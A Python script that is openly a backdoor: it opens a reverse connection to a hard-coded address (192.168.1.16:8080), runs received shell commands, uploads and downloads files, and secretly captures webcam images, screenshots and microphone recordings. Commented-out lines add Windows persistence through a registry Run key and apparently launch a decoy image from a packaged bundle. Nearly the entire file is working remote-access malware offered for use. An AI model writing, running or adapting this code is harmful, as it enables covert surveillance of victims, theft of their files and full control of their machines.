#!/usr/bin/env python
import socket
import subprocess
import json
import os
import base64
import sys
import shutil
import time

class Backdoor:
    def __init__(self, ip, port):
        #self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    #def become_persistent(self):
        #evil_file_location = os.environ["appdata"] + "\\Windows.exe"
        #if not os.path.exists(evil_file_location):
            #shutil.copyfile(sys.executable, evil_file_location)
            #subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        if not command:
            return "[-] Error: No command provided"
        DEVNULL = open(os.devnull, 'wb')
        try:
            return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL).decode()
        except subprocess.CalledProcessError as e:
            return f"[-] Error: {str(e)}"

    def change_working_directory_to(self, path):
        os.chdir(path)
        return f"[+] Changing working directory to {path}"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."

    def capture_webcam(self):
        try:
            import cv2
            camera = cv2.VideoCapture(0)
            ret, frame = camera.read()
            camera.release()
            if ret:
                temp_path = os.path.join(os.environ['TEMP'], f'webcam_{int(time.time())}.jpg')
                cv2.imwrite(temp_path, frame)
                content = self.read_file(temp_path)
                os.remove(temp_path)
                return content
            return "[-] Failed to capture webcam"
        except Exception as e:
            return f"[-] Webcam error: {str(e)}"

    def capture_screenshot(self):
        try:
            from PIL import ImageGrab
            screenshot = ImageGrab.grab()
            temp_path = os.path.join(os.environ['TEMP'], f'screenshot_{int(time.time())}.png')
            screenshot.save(temp_path, 'PNG')
            content = self.read_file(temp_path)
            os.remove(temp_path)
            return content
        except Exception as e:
            return f"[-] Screenshot error: {str(e)}"

    def record_microphone(self, duration):
        try:
            import sounddevice as sd
            from scipy.io.wavfile import write
            import numpy as np
        except ImportError:
            return "[-] Error: Required libraries (sounddevice, numpy, scipy) not installed"

        try:
            fs = 44100  # Sample rate
            seconds = int(duration)
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()  # Wait until recording is finished
            temp_path = os.path.join(os.environ['TEMP'], f'recording_{int(time.time())}.wav')
            write(temp_path, fs, recording)
            content = self.read_file(temp_path)
            os.remove(temp_path)
            return content
        except Exception as e:
            return f"[-] Microphone recording failed: {str(e)}"

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                elif command[0] == "webcam":
                    command_result = self.capture_webcam()
                elif command[0] == "screenshot":
                    command_result = self.capture_screenshot()
                elif command[0] == "record" and len(command) > 1:
                    command_result = self.record_microphone(command[1])
                else:
                    command_result = self.execute_system_command(command)
            except Exception as e:
                command_result = f"[-] Error: {str(e)}"
            self.reliable_send(command_result)

#file_name = sys._MEIPASS + "/1.png"
#subprocess.Popen(file_name, shell=True)

try:
    my_backdoor = Backdoor("192.168.1.16", 8080)
    my_backdoor.run()
except Exception as e:
    print(f"[-] Error: {str(e)}")
    sys.exit()